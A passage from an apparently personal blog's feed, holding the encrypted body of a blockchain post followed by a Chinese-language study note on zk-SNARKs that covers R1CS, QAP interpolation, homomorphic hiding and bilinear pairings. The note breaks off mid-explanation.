8a753792272eee25ad8579dd937a0e6073913088e3f315643494eceec36490affc50ac8681d639f8c859c037f5aa71e3d6c944a2c8dd67fe23e418dd3a3f87c5f150520370f53d9a33f3b3b0c18906fe7c6cbfcf1a0eec885b4b995220ca9d690dfe8f9f5b372b4c2a7c14586f7cdde56b44b68813427465274ac4526b7f65072d1ff46c587d1c34b54d097ad9ee153fe8879588240394162f8d37f19b14bde9307743f9c5309997242c8f81296ab6af43d26d80a24933b9c9cef3e52d822c5c3c5204c021ab3b1256895bc599a4654ba4927bd38f01a51b0ef8144ed528776117d99f46de004576fdd6ecf6f590bf366db2a10843c434b889f2f9fc77cd6aef58c27a077fb5f4e315bf69236c1c28d3e26544a91fb9a670b710ecc0b65d2087ee6454c21aa932b1ff5e02657b0b10c1d4d05a21975bd6fe5159b3155be495cc215f9920489685cc4f00bf80ab614f104542f57682c7d0d9ae79f5edbccacf0603f5b6747f8e9c953c4a78f7c092cd5ef0489c2e52fd95215c979b62d666ede274dbbde47f4b2199612c375076f6013a1616b2b9ca86a71f2e72fefee290d2d5bd76a08518cb0b31e92cfe4d2681c43fb97e3c7df3fc1a9ba897339b6f802d33a55aa1e42f5a219e8f32097e21db646f529294dd989f803d8fc8b29f874bd5ba3f74aa920b81abf708413d6fa9507a02d5471981e60912e3e4d749824c6034628282f7371d11148bb9534a3bc268708dc30d43e8595e6c705298c84f3e381bb61dc725798660f28b6f84778e85cf04f8d4f9a59021bc20ab5330918b09f7f20e7cd29fda884a85e397bfd66ba933a7e5d1944f025a47fa2deb75d38a98dd0e2e7d58a0001abe98924e56f31bec106f022929d6efb69b076478a9ecfc3cfac00a39458e80e1d3d4af680e33504cce49361b84ddda7845f03c3f021dd3691e704a6bb226906fcdb656e9fc552cfcdc2d9c83c1c95e3f8003f77ddbd42ded05cf037f637e15a7a5a42a4ecc8ae6e06e11a789b9130bf0d422597e0dc87bb1da5c4d14cca18dc40bcc631b39ba3a0019df156c6c8df6c508b4865e1467cc38d04d11082d997a4e057972b4cae0d31d1fbff12f649db6046773e0d95e3ce7a913430a6fc9f1c4fe59c7487c41e514113f2690e6b83724d8b9d7f578d8a2002fad5f9ce590fe36a6dbd8b62b23b4f6851b91a9bb29cf50efbb7c11c66c81469d5b60f6be35834b5f104b35cee444e2d2c61bf343ccdfa018cf815b029b55a3c116b6dc69954f1fa69eaf7c8e5785ae9b47c1dd642755e09ebee015cb2f6b01cddd40c4451ac539b94c38796c17eab9f9da1a44b5a4365cf2dc1d9935d33cd106be3106165fb54d9f063f3e796ee893a6ca173aabdd41fc30db5c2ce0dfc7cfa7f540dd7406023ae931c7842c41caf9fc89908516c3ff04402fcae151ff7ed0203662b3228da428902834f78173fa973e7936efa37456b1d7047b2903fd27101e14aed61c18f0b44a1bc4441a95d7a188836339d7bb75dcb16c95a6dd2ddba43a2a905b6981c19109922c73a979e9895e30c02a2e559549b45621ce2a94bde2333685c2df565b50aa87c855752d497647e80e16612c08789ba461071c520996ad7e7bbeed1f14d603199fa8b9f336bce4b98ba94b64e1a4378a547390819b1aa562ca8767829e3aeb815e570bb48b7957e30ded9ed020a075c93de2d2b4bb48dbb445ed2b6c96a24564f062bf17e8c87bc05f296f800975e9aeb6f60e02c0c650fcdd169a9f361016b3295773ee1c338eb17088e03ced8c71d17025b46d811976d94b40d7ab805f3e3329227053d351a45e7e86533d8e592e6f07a8896920f424100aa9365e68f3f46c3ded4a12fd534fe8e904fbcf0ed85df637af7d9021945c1fbe2357cce2ffe8972e306ccdc04b0d694600558c3b11178607cfc362c568cf1a3eee290cd86c34b5803b3780a19e06456e41bede947359325e2644d218a3c2e9727ead3e9fac9ad0a612cf5125561a37f20fd7afa867ca4a47b5850799cf8ed9e7b850f854a723237689c1b7a243f4953bbe8a40980561c6d86de52bba491825806bcbf677e4a692edf06fdb853c9ad30838a29567ee8fae35a77fcd3363c99c6a763078c09afa4ae237214825cb893037ce42b759c05463d6495e294de7c31e2d641495da4a2b53ea3608048d1ad806064b699128567bd2f28d293820192bff551f3ce607d8e55be76c15fabb00897b6756b35f2c7f561ebbd62b87bd034add7fe524731f186673f0a77f579b40ebcf7d7165b8ee4f3fc9dee7f48c7bd02a84aa7fd1e6c528d7546816ac0980e13749a79aff66677e22dc1ebe1195b2c70602a5399c2b97ff02387cdc69395ee6edad88b1ef478d9e381a7347bcffd90c6492639d1ceef06b41bcc6520dca3a3641346d455b7d6e7229cc718aaf1da75e7fa5aa7dcc7a1675fd1542b66e1fc27efee9df2f69259181ba9eee9e044440dbfdbd6633747c287f1b61e5763ae990c47cdfaa367b6824e5a37561e1837e8502a2e4ce0527c3a1a0f91885844513ba47ad78657dff4e3fc7ebc041597bce51299c660d226a29ecf41cea03c3744b6eaa9185da1d2019cfc7a758af49f0fdeea01b99aaab0f17c5522e4c04fa0c23e074bdfab13ab4384951aa6585a0f2355194017065e19426aab1a22efa4b33bda3c17c42099cb83cedf9c2aed5eb2e4a6db334453e635a97c09a321455233a5e0d8b1be073c026bb4af7a1a74c9fa7e383600322df6a87d88f4f07813ae1ee81f7befd3911238bd2d0f03efe7768acd24e2c7b75b726bc7355c3a5e702734d84d7a85602cc38af1248750c002dd362269da8ccee5df068953da1d2c2682800b6caaced26e4ee33a744efbb082e928eb3287b9844c2c55082497f16ecf31d8599dd63474992d6784f06dc6dd292017c546634b4a8f7eaa1e8a52cef6e7dd4d59a44fea1a6aed5e65485adafa2b5f55c486d565b0ce5c1067773ad803c0e3257883eccf4c0cda927bda25a3ba3cb41a6cd324f7da224eefd1bbc92e1df74e21ac8765130fdf4162181caa2e0b2d9748acb1b76c3780b2012d6324cae8359b6056849847a747ab64ef96e3330287fbd231ac271261f843f8972409ab9037373fc98c42d439fb8dfa838533503cf66cb089dc72923e7d9e1692cc3f333092cae55f459808629ed1875942f6757bfc68d7e9a72225fb3e8adf5137fb57dbb82f21f34742728bb437d192d7b86f156fc8c71a95014c25b7470ab422a801e0c5198d14c3caec6d700a6b83cdef98f924467da14266c08109ff0d695a0276e79e74f45504289f0bf6a42d69282eb87b701c9515a0795844aec7ec79b2ef31c9d0562b800e949e936c1a7a2cc2bad70abf48ab58031417f687ec5ce91c01ad8d8c50b3ec4ad18683406a9f4e36f122cd3b97f179543c46e49d6ae4c1e1fe0a539408fbe2957c1392905e70cbbac5b9cd44ea1e72ffc64c3b55c1e489753da5b75592a6b11a09fe4111317fcf473e4d5e359f2bf9e3fcde12e7e3c3717e45acb14821cc39c3ff106ce135cc6ca140f4443b000e9da8de5c75e1fc22dcb84d6cab652be4ed9d25149cb72bdcda952a11e7325f07c691e34bc479baccdbcd2a7e786ca4c0b6cabe73777f80d368641ee700d4798a32a2b078119281766ad64e11263e7758d25abd203fbca3f6f43ca5ecb52697de65d38d7bd5bccd325a97c1c9f2f942686402b2fac5f670f257c7c61fb5a0ae43cfb1a6a5ca92c78d91dde10177492ff7c0e9ba2ffb11dff21615188e3c16c0c777e45bce8368aeb8975f3724ad0cb1b0ce78e415eefb8a41a507fef4415a180efe882b94e6f1bb5da435c98c20b8e930cf113d19cb97aa866d145db2eeadb9c6a0303e84b87cfaf17d48747e233f18b8014933a023c6a80a30d7ff4562d3805fd1fe14131f7f16e1fa648b92de8fc1f9dd73fb26cc09f69c1a182cdce8635f977f759df2ebb0b97a66b6572d7cb144bc04019702c84e4e51ddfcb761a1ceb766a59367a90a5fc2894923ba6b3e629b43870fcdd2afedfc2a6bd05a89a69a0d96f363ce2b79d09fd7b600a6a0976558ab20bf781b1644fd32ee8cca7f8c2ccdd0c3f5672176631c7dbf80bf024f10d70f36a53591d876a4394336337ae4d8db4d04cad991499411f458e894cb7f2835e40d1d74a100f005d1ea51ee5e3efc12e7b2e7b0ea3ee040be7b62aff9f24a197b7826a5d8d9949bd1ac75e2e86f377bfae02cbe9f82e9284959d50215fcded2decddebb7768fb0c7f50532a5b5255655ba73ec7fca7db2de52eb8db19819290e8ebd817d63feba37b96726fb138d56b422c019cb246f26ef532e6f7585aa70ee7fd761e455c0cdf910fb1a4bca2b8a77748dce9526c3c74054a29290e7230ef228f8c1a92feb620764a0b7b1c2fe9d46f83ed3e2b9d73c6f9fe3bda7db43382f2659c4502934d1d192c921d57717f47d811819043c98a901dd3e48503ae83b6cd2a6a187ba3230a31eff07ea2c88b47dd25ff63c03f0e7d4a3884763aaefec047e6310c7c649f960fc6af1cba8ca7b44dd49822de8ef326ff9ff25d1f5aa2a1eb272ddb2ca9a4db9cbe4f573f62bfe01fd8a910f36f88e74d916ac4e29cafa4c034495a263f6737f52bb7b53a72ceacc31c9a10a846e71a6fe3f6ff585519e84f8ee15b57fd072c4804e87d91ab74d30d45474af7d3d6a75b1efc4afbee1ab14343463c356c53deebcd4d89f56ff8d19b234caa9086ce2875793ba2450e271ceb7ca19e97533312c3733d9afa1e03ef1d3c294dac91063d66a3754380438b649b8d77eece5d1fa1d53afa49739605358b976fe8909450a0d635177b32b0c09cb0d03148961e693f6d9dba0ee88274610654fb262ab686728c8fe92995561a9e026c88a3afd2bdcfc6d81801e2190f0b9c0b8f405dc8f7eb7278047b29aedd3d6d8fd3a5b1449b01e389ccb979c0f0c4caf20c351004b8b541f6da9ca921dad3d691bea1d1942063c204f08762c7d22ccf5d34eeccda6944e75c3df63c9bdb4fe675e56ed0675f02762772b3f41b7313c987d60459c96459b7f23b01bd5e7cd04175ef05e1b85235e1014c09b8e84faafa683bb53a335ff176f63688dce2fe488070baae9b9200a7d334300c71bfae3f77b29f18d04be13cb5c21cfb05fa2a4dbd95767dc2f2a588db9fdc5ba6caa09764a29b45388a5b42b740eb7fe36348fb3397288fe93ba086cecdb8ef620f524a01d581b424406aca7abb4d3f9c95e246a050b3f3fa371e327206cc7069c89647be993527f31ec069386d72879d177f8e07cfcfab4f948fcf7dc7b3cfd32387bbd15d9cf5faeb587a4be341f369de6eca688ff59037a32e31995b48238bbbaf931069721da431b4802025ec8e79b12651b46a1f9f35225c3667eb8af24ab58aca9dc5f7e101918f378251dbf6a25abb2e33c5da2af14dbf602053fc78afbda49803bc3277b6731066eff132801be85e90bb22fb168a4ecfb00bdfe9507d1adba4438b03abc216b7936a60948d7ed4e13f9b0b97bc3983c7c6f25a11da715c913dc42902879fd5ff59de0c7ed5044ad0393c5aa33065b65c496229e053d88b9c1a04519862eaf54a475172521d3ebec4783a4371da52d11128a4eff65d04a4f9a94a7f2fab42d63441ecf3cd174eb7fd3038aa8dc55c62692e17c4a693ec635e3c47f16558785e4fbc58037a0465a66fbe8042a2af2332b05b4ea0573c13db49dbdefd24941f08065c10c3b5714bf64fd032a0a12de64c498161eb11b43d716f1d644be265003a3bfc19aecb5a472ea007dc0b754ed61a5ffc9eb109a36f821cc5fd525482d7a36693e6923c8d90afd321d70d2af68309640460c0cc609456a23287a00b6b245011d58830d92661ae308d5032f00b2e5d8bef35f9c0d77dd05322b07a82342714cb7e520cb3f6e002995db36fabd9b927f64d76143a10ee3a63a2fa677854708485b2d76a36e9cde5bb130439d9a5bca9d8506b96563d11a44ec6522f179ee68f8590df6b31d18ac7e5d9360c149943576a3afbeeacb14839093c379d15ad84de17628940c2410d64ee37a7d80b654da9987527b444c44909b59ec351eb0386045679da939b4d330f77f27197025db7a7d347fcc7885388d1288596a25aa7cb9eb55a41295dfa412a0cdc306a652e5f043edd32595fe5aa6b32291ce9d48fcfec90a44d7283cde5960f74b1f0c0dd79445d7f6388b1e623d3ffd73bf85b914fafcc1d99668e63db7f2725c182128937a371eb9deab14e952c5fe9c14eb3d8545310a1fbe4de7fa3142c53de7d82d6a629a9346fdb6d4044fe7473c0cb70ef3188d68856f904f2578c06d4237d8fefcf17d18642cd118b5c31c93f078beba0ee0911fa4d0160d3544305b483224544e87c5787277e058cdd92bbf5444e74c89d5eff30ff216ba2f6972b570d3e9dc7a61d63864cb704022c430c3574d2aef56d77a8d9c909dd22dec8775314984db42feed1ac0350306b4ac41876c0c534db98e02163fa70ea4ccfb3936d5946097bab925979dbb50871e8b61dc6d2db2c64a571157c30d6dd2fd8166c1d395724b391488c00d11dd084e5971d01622a55e4937df6de1681bcbd7cb53cea02771d758042649237d69b74b8c832f3e91cf07ce29f57ee85b178c1736fc154fbd747b409aa71f45ed8df954136cdd8ffcbd0c84192d2f48de4222b1f0863e803a1e77b6fff03aa8c8cd06c4c07b1c32352aceb73bed77bd2b2934134471ebab9cf102b2da08b1eb98b92cb56c77f0e316338f6b96dc1440fed84bdc2e03eaba6ef09acd0954461f42326c3f85b8bde4f66f0029905f572b07d2b6617ebd126d404d7dfb0ed2ac3b0c4674d221a9617fbe7cc0e4a2c2b2549cb3d545457bccdf154e5f9251967887ea2e75335433b4cc748d7778012e1418f20562b8969f934fde500b2334b9e937912ef2680214d75a5d14f05e4751ea8ab8f74eb9805081328407b7cc343ccc3b60abc6cdbc1c140fade6bfa7f356e073fb78a27a3c16cafc9bceb50ee7bb21f4eacf68332c33da590157f98d07f64eb45a9acf8596ebd0496b4c166a39fd452223f0be3c6af830270933f48f4e4aa6e555d21a1240f89c59e9c8e579a55cace3e41acd72a7ec726c57c31953e9bc367c6369d681b11c16855388aa7452f93d6cb9f41efedb031c10ff95577857ce901d9177a9a4db56e8bff3050d6b05e09f288f7fb9de229d5b9a51586af02953341a42a2a6e3bf00a803606d4647fd047dd0b554a08d4e3cb73b94e1fbcdc3a793e9b7a3b1961fd47ea1ea8e82355f402da81e1fc49ab2ca9299d4e1f1c1af477523b2d795e77d487e8fee8eef79726a965ac23998943f5a1a90cfc56711edd14a703c575ebceef4d5c1abef22ba52177c370da22eb9d00c6662fd0ee7fd5ee39ed78a13190819a9920dbabb4f72995e2c6f16f42a70cca207a1182d6fab37380345ce752ce229c1db24d14a4dc8924c00bb1adc78a7b32730732c0ff9afa3dca605b04219b5efca30489294d843924cc207273aea609414b2224f376950bf8bc38510fc91c68965b0ac10af12fe6d31b4fc4a1f40af035934a100ec9985f16742df0788994fbde046b268b1f78de542604c6445f820d6bc98402cd79dcc0122f007e0c0d3d29adbb129b986e510f8625e6574bd2155f1e01f216a9bdccb6078bff4562ae4fd32da9609abb5b42215d6f8439c6d65da1a97872a3df6c0cdc89d4c4be4bd7e79d5c01c1ddba7b1da6b3bc5a0dcfdebaf444c290e8fe3c0671a8fee5f989d187f7b1ec2ac33d5b3a83d2a976c35f4def0f8c41468cc298fc5d0aca42c3be674437862e4b1e2b84af1bc10a6d74ea9ca1ab00bb3a54e333091fcbfd95b028bac8c39143122ef56f3298c47629f0f8a7ea23b9ff1b3ce2f55639e2e362d04d72fda555be71055686ca51e36ea9281224f5b606f2a91ab9333ee77d19c5cd1f87a90dd2db80bb062da10b971bf17f3129f56968a8183207cff33d53ff188003c88b7f0e2abb7f398ef6442fbca3205902bdcf5fef962d071bad935149f004eae20ca372c0c80ce824357627166bb18211cc4d141807d74b5878d1864195d31eec2a6486d385b9d7851615ebed6447db249848fc33bb89f31ec32109a73efb9c726fd9fec0f7e3afe795afa398097aaf02f34646662a1cf44aa88e062494920c4efa79543b1865f920741367b5f86f7ef3e3ae9f02bc046c22dd4d9b011ade6b53fc0cec5c5b1f9e7dbc59ce39a3503996ca74b20c612abfb31eef8284e2a3f72a32e6a66ada4046b40fe6c9b2bc81a7ea58cd92df52b42249b0cabeec142ec141d059502e5d04e16c9d66f6e5dc0e0506eaec0d115b2bd1f010a3a64cc63a205b220af3e41ee355baf033d71c34a888b38f4f5dfc9a897484c53ff25e5934bcd05310f3e283a64fc24300958965ad8ebc024b936e7a0f2adac4bc2ca674640a8bd8b4975d7ab60248a33a8abc3e49d5097e5c04392126cba4501eea860daefa70e01cdc3b76dc8572f10a9ff18ae6622fe05a2348ced97186aa6c466a8a99f7c9eb81f271ea5e1403d9c30bded2c4498c60ff7725fdf1b2b06eadae103cc065a470e6d0f7abd2a061c866ffad29c70048aca85316b19f161b6bf31a08c1a6bcb7821168a6eeea88fd249de4e2c911d3be71f75c34a03af3cf6b1b13de92df3a3ce6b3573f1c541e4448208e638cfb5efaf2abbd91fd9079f26e776b0c70ac7ba2935069dc0d8f0657d4751bd84d0f37b98ed59c2af7da1155645b051ddc255abcc31359e28d9f94ea85863d17748673f509f32ada216ad19c26fb42adf6526a1034f2d3c166ed9b026131d14f72a0deb7753d282cf348a2b8f27f1a8e2042d37fcf23e5c391a8d9e5a746d3a6d28f2dad1a9bcc967af13eaf723d2694523a449e39a699585424da2e38794624a8c1096694069cca424715e5837364a65cec7633761807e8b5694cee5f7ad57fbcf3f7f80b18b008558895bd57f3010d5c88d8475d50f84aac3e0d214072fa692cd8c4a1c807336d537227d764b8ed024f8fce3aedcfd7a662420ece54dda6fe086a6c4f3d0f0b79e765e7342b99d731dbe5c36e1d4a51543eaef61afbbcc839dccc440f77aaa07b9822591471d3ebb4907d8394457fae2fbe8da00ee03803fd4d949295909870f326e05e617f172b36e384d800325bc45e07072b5bcc2e50c9ab07257640f2e2b5c383832db01e24904ee776e8e14a0404066da80a330eaeca3810511b5afde9d6903862bad8f7093ca48473835a44ed3ff765f043a00fc7034b97dbde9285002c97f2465ba07a441904f074ad985d15d1f7f23d80e0c7915056c2f6b70789c28f9fc7c72d914184910c3a48686847130f7339931ab8c9462ef0a1d26ff316a6ba8f463332f1317483e8ead2e0f7de5938997f6d15457087cb77a16678b85907845c3eb7013810164b8bfd1b63d308749863c110e38af731ff5a92b3c8d2626324ee13066b96c9eb8844a46603228278414d0fee195786c117fa661fcaaf8989b223335eb0a6f96045063a24e84fc777f9d709ee38b279866fa960b482f662c7c8b99b80ed847023005a3ec2105b09013e5b3b5ddbbf555c0ddf81c36b4a8430fd31d523b8bb1a56ed73765a6ed41b3a9a51a8042fb137924ccb070bd24ff26da11bdce72d94354ee32b79e7eb8015ed0ccebddf63bce08bb40ced4fa31cb8a8fb03374b490a8f0ff5f33d739941a23df6fd0c7832e018de0e1d384b960cf6baf0b2431202d513dcb69adebb703a2328896e31c6955bfab64988c11e604a4f95c972c6a3210e707515c2ffb67527cbeee85a1da213a3b7edaece73bd8359d690c6a502f88fe5de40072dade753ed667f97f803790653f2b580039edcc789ee8ffb6edf9fc4515ed7166b074b032932eaf6c6be489fbb463e167dd83e929d4027076e6e15b025e953b8209e8a96a2f33c2706bf6faa525170714d9faf0c12b7bf80233d2554e2736696250ffd26c20dc013cf7aa85c25bd48357bf4e9271fbd65ce2ff871a0b33fdf83e47c43a0b6e8602d40bfb4f7396b5c65ca2eb21f6634ea214f4f4c71bb3fde294f06d78992fadf56b8c6a06ba1b3dd310f4f9e13b910fbe34c5d098b53007fbb084f01dfd1c7d7f4358692eb74f6ef8ca3160a1d6ff7cb03909b40efeb108e188ebdda2c5e7ea6016da7a8947017b14fa773e6a47c2cd0ab3fec25ce0344a2f627ed849b1ef13be1ecbc26a51626b14f02cc68936da43642bbd784d239efa486ec33003f6a88c42a5736629102aac3418f098410b74880a1c7c0d7b91ec99553acd43e47ac8c364a4efa47dbec0e4ec693444771a671421505d0e45f1cac0d1aca178e5aed7f0e75b4dc5c7c51f3b033c2ab0f0ba5b9eae3408aa6bf5d4b6c4f8e5d4e23b28b2c2aabb311229072ea4aa9afd15f5d20904f6238e1cb5133466c5157a820a6c9ad2d72870429164eb5140f4fea72a179247f4981744f5ae702c3cb8a63ade0f0d7b56f9682016ba923e1747e4b148868131caa1a3552065747e94f35ace0661fe8f0b84dd3f56c2a4987761fcec9a0a36aca82107e9908318a1a958ac670228a1c47a4da5d235e76b13f005e8b4923ec47794a564a88f02716076d18e2cbcfb32d4b677f434dc3d012ef311bf40b8fc10c3f42834ceba5b9ac79a5d1e1bcff08cb1297e76eccf00b97fd6d3d4d26faaf62a0b111a6f0aa73d540eff48bffcf5a7b838672402596492f1371630b359cc2fd1cc274c5b80d7b8eb7c26624c2fe1cb14eaffd84e1875d0bb13ba44533de688b0c061cfa1dd6f12e8e124e4f99e44683decd02d0ada87917660c456b567840b0fa5a986374fd5dd21d99875944dcedd516e190f7837be3f1eb0a8e6eaf8331b3b0add70e5c5af9ab69f8e870aea3a0fa21bf663b87787cd2921be16e4d3980264afe6354e8c92fa8d2e4f3763878708263a4eb2f424a054c97a1f7cd33feccf82f888841e589d4cccd293d0cc3ac5e04dab24a729dccdca92c8e03452f9cb43fee1b89d09f5cee9daf451b27de66950475e74bf8fea9b0da32723345f9eaf9d1375ce90e5602173f17a58038da0567dbbc41a1cce91e8c33797d3fac204e31a23d3bb47e32a13990dbe61babaf800761ed036f381918a5d5ced269582fda4f6c6b2a57c512665288ba660cb171a5c7000d833daa379abf5489de346cd134b8ef266b4e5d073726ed8bc805bf9060b7d1d20fcf55405755f8e8cfe337911d7934ee0c3eec2b4cac47f6b1ae111b90ef569848117eaff1ba4b174475f02d15c9f8d8d94c0c29e8738b08579191959407373d92aadebb0dbd0ddb8de2e63ae463808e3fd714b8ef823a2b97b5f192429057758a3429807195de56a0243a97e6e866455c046a3a957514a0883debd636ed1e1b7152afca2dbc7b023396e7499f9f31386a22f09afed2bf7a0c0e8f5b2de4a67840decee974279d2af129e652e01eea74a78395da2f094c5b26aee60779dde1a9d06cde1ec2ff137da2c9176ccdf7eeed14283ba56bd0c78a2eefc1f2ba0be67eee4ed63e21dfe2ccf1524c21aa42153b6a5aa49632d78ac696e2be41fd4f0ff4064095dc9b58e74c799909706595414bf15b1c2efcea82fc2d4eaf2314102948f9645556209d42f812ee91c85d65d160f0db5ff2d08c73b4daf557ffab3bd8b794718c380375387a76ebac6210632d8a88500d1fb3f642b3cf554569f8524d692d763a2d49ad1653eb827490e867c08ba2a78001f957ef9f1dfffee92e9d43a13cbd9dd84f98441057527253872f937d56d5a1ee8636e642ccf1f241b0553fcce3fbd6ea19a61b78c4c58599466d89f6c2a488dcf20c103a5627388efc9b15592498880715ec279a791ecdce9e7e5fc8327c066d390054cbf24586605a10b2df0590a13f9449e6005d96e988d96a191a4cc48</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Learning of NIZK</title>
      <link href="/2020/10/26/Learning-of-NIZK/"/>
      <url>/2020/10/26/Learning-of-NIZK/</url>
      
        <content type="html"><![CDATA[<h3 id="R1CS-of-zk-SNARKS"><a href="#R1CS-of-zk-SNARKS" class="headerlink" title="R1CS of zk-SNARKS"></a>R1CS of zk-SNARKS</h3><p>需提前将待证明的命题表达为 R1CS (Rank One Constraint System)</p><p>e.g. 给定等式$x_{1}^{2}x_{2}+x_{1}+1=22\ (x_{1}=3,x_{2}=2)$，将其化简如下（单元仅包含加/减/乘）</p><p>$y=x_{1}+1\quad\leftarrow(1)$<br>$z=x_{1}\cdot x_{1}\quad\leftarrow(2)$<br>$u=z\cdot x_{2}\quad\leftarrow(3)$<br>$v=u+y\quad\leftarrow(4)$</p><p>令解向量$s=(const,x_{1},x_{2},y,z,u,v)=(1,3,2,4,9,18,22)$</p><p>$\langle s,a\rangle\cdot\langle s,b\rangle=\langle s,c\rangle$</p><p>for (1), $a=(1,1,0,0,0,0,0),b=(1,0,0,0,0,0,0),c=(0,0,0,1,0,0,0)$</p><p>for (2), $a=(0,1,0,0,0,0,0),b=(0,1,0,0,0,0,0),c=(0,0,0,0,1,0,0)$</p><p>for (3), $a=(0,0,0,0,1,0,0),b=(0,0,1,0,0,0,0),c=(0,0,0,0,0,1,0)$</p><p>for (4), $a=(0,0,0,1,0,1,0),b=(1,0,0,0,0,0,0),c=(0,0,0,0,0,0,1)$</p><p>从上述向量扩展到矩阵$A,B,C$</p><script type="math/tex; mode=display">A=\left[\begin{matrix}1,1,0,0,0,0,0\\0,1,0,0,0,0,0\\0,0,0,0,1,0,0\\0,0,0,1,0,1,0\end{matrix}\right],B=\left[\begin{matrix}1,0,0,0,0,0,0\\0,1,0,0,0,0,0\\0,0,1,0,0,0,0\\1,0,0,0,0,0,0\end{matrix}\right],C=\left[\begin{matrix}0,0,0,1,0,0,0\\0,0,0,0,1,0,0\\0,0,0,0,0,1,0\\0,0,0,0,0,0,1\end{matrix}\right].</script><p>$m=A\cdot s^{T},n=B\cdot s^{T},p=C\cdot s^{T}$</p><p>for i in range(4), $m_{i}\cdot n_{i}=p_{i}$.</p><p>对A,B,C矩阵作压缩 =&gt; 多项式向量$(A_1,A_2,A_3,A_4,A_5,A_6,A_7)$</p><p>即每列作拉格朗日插值，e.g.</p><p>Matrix A的col2 (1,1,0,0)，视作多项式$A_2(x)$经过点(1,1),(2,1),(3,0),(4,0)</p><p>则$A_{2}(x)=1\cdot\frac{(x-2)(x-3)(x-4)}{(1-2)(1-3)(1-4)}+1\cdot\frac{(x-1)(x-3)(x-4)}{(2-1)(2-3)(2-4)}+0\cdot\frac{(x-1)(x-2)(x-4)}{(3-1)(3-2)(3-4)}+0\cdot\frac{(x-1)(x-2)(x-3)}{(4-1)(4-2)(4-3)}$</p><p>$s\cdot A(x)*s\cdot B(x)-s\cdot C(x)=H(x)Z(x)$, 其中$Z(x)=(x-1)(x-2)(x-3)(x-4)$</p><p>即表示x取1,2,3,4时，左式得到的多项式取值为0</p><h3 id="zk-SNARKS"><a href="#zk-SNARKS" class="headerlink" title="zk-SNARKS"></a>zk-SNARKS</h3><p>假设Alice已知$x_{1}^{2}x_{2}+x_{1}+1=22$的解，要向Bob证明其持有解，但不能直接公开解（零知识证明）</p><p>Bob随机选取点t，该抽样点的值不能让Alice获知，但需要Alice给出P(t), H(t)，供Bob校验是否满足P(t)=H(t)Z(t)</p><h4 id="利用加法同态隐藏抽样点"><a href="#利用加法同态隐藏抽样点" class="headerlink" title="利用加法同态隐藏抽样点"></a>利用加法同态隐藏抽样点</h4><p>Bob不直接发送抽样点t的值，而是通过同态运算E(Alice无法复刻)</p><p>发送t的一系列指数映射$E(t^{0}),E(t^{1}),E(t^{2}),…$，Alice利用这些值计算E(P(t))，E(H(t))并供Bob验证</p><p>Bob计算Z(t)后映射至E(Z(t))，验证E(P(t)) ?= $E(E^{-1}(E(H(t)))Z(t))$</p><p>但仍存在问题，</p><p>Alice可以自生成A’(x),B’(x),C’(x)，其s’满足s’A’(x)*s’B’(x)-s’C’(x)=H’(n)Z(n)，则也能绕过验证</p><p>因此令，</p><script type="math/tex; mode=display">A(x)=s\cdot A(x)=\sum s_{i}A_{i}(x)\\B(x)=s\cdot B(x)=\sum s_{i}B_{i}(x)\\C(x)=s\cdot C(x)=\sum s_{i}C_{i}(x)</script><p>则QAP转化为$A(x)<em>B(x)-C(x)?=H(x)</em>Z(x)$</p><p>Bob发送M个二元对，$(E(A_{1}(t)),E(\alpha_{a}A_{1}(t))),(E(A_{2}(t)),E(\alpha_{a}A_{2}(t))),…(E(A_{M}(t)),E(\alpha_{a}A_{M}(t)))$</p><p>(其中$\alpha_{a}$是Bob生成的随机数，M是多项式向量A(x)的维度)</p><p>由加法同态，有$E(\alpha_{a}A_{i}(t))=\alpha_{a}E(A_{i}(t))$</p><p>Alice通过计算$\sum s_{i}E(A_{i}(t))$得到$E(A(t))$，并类似得到$E(\alpha_{a}A(t))$</p><p>类似的要求Alice计算出对应B和C的二元对后，仍存在问题，即<strong>无法确定Alice用于约束$A_{i}(t),B_{i}(t),C_{i}(t)$所用的s向量相同</strong></p><p>因此引入多项式序列L(x)，其中$L_{i}(x)=A_{i}(x)+B_{i}(x)+C_{i}(x)$</p><p>选取随机数$\beta$，Bob发送M个二元对，</p><p>$(E(L_{1}(t)),E(\beta L_{1}(t))),(E(L_{2}(t)),E(\beta L_{2}(t))),…,(E(L_{M}(t)),E(\beta L_{M}(t)))$</p><p>Alice计算$E(L(t))=\sum s_{i}E(L_{i}(t)),E(\beta L(t))=\sum s_{i}E(\beta L_{i}(t))$</p><p>校验$E(\beta L(t))?=\beta(E(A(t))+E(B(t))+E(C(t)))$，（因为只有当约束A,B,C,L的所用向量相同时才成立）</p><p>最后发送$E(t^{0}),E(t^{1}),E(t^{2}),…$，供Alice计算E(H(t))</p><p><img src= "/img/loading.gif" data-src="/2020/10/26/Learning-of-NIZK/rf5OBq87NWCjy3K.png" style="zoom: 50%;"></p><p>1) $E(\alpha_{a}A(t))?=\alpha_{a}E(A(t))$校验Alice传回的E(A(t))是否为$E(A_{i}(t))$的线性组合，B,C类似</p><p>2) $E(\beta L(t))?=\beta(E(A(t))+E(B(t))+E(C(t)))$校验A,B,C中使用的为同一个解向量s</p><p>3) $E(A(t)B(t)-C(t))?=E(H(t)Z(t))$校验使用的解向量s是否正确</p><h4 id="实际方案"><a href="#实际方案" class="headerlink" title="实际方案"></a>实际方案</h4><p>上述所使用的同态加法运算E在椭圆曲线上，因此无法实现高效的$E^{-1}$，考虑引入双线性对</p><blockquote><p>$G_1,G_2,G_T$为n阶乘法循环群（椭圆曲线上加法），一个双线性对e就是一个从$G_1\times G_2$到$G_T$的双线性映射</p><p>其中满足的最重要一条性质即为双线性性：</p><p>$g_1\in G_1,g_2\in G_2,e(g_1^a,g_2^b)=e(g_1,g_2)^{ab}$.</p></blockquote><p>(椭圆曲线) 假设$G_1$上的加法同态运算定义为$E_1$(基点*x), $G_2$上的加法同态定义作$E_2$，则</p><p>$e(E_1(x),E_2(y))=e(E_1(u),E_2(v)),xy=uv$.</p><p>通过双线性对，当t = xy = uv时，</p><p>$E(t)=e(E_1(x),E_2(y))=e(E_1(u),E_2(v))$</p><p>且$E(ax+by)=e(E_1(ax+by),E_2(1))=e(aE_1(x)+bE_1(y),E_2(1))=aE(x)+bE(y)$，满足加法同态</p><p>因此可采用共同参考数据集（CRS）实现以下zk-SHARKS流程：</p><p><img src= "/img/loading.gif" data-src="/2020/10/26/Learning-of-NIZK/EvIdr9wHxL6UQAP.png" alt></p><p>1) 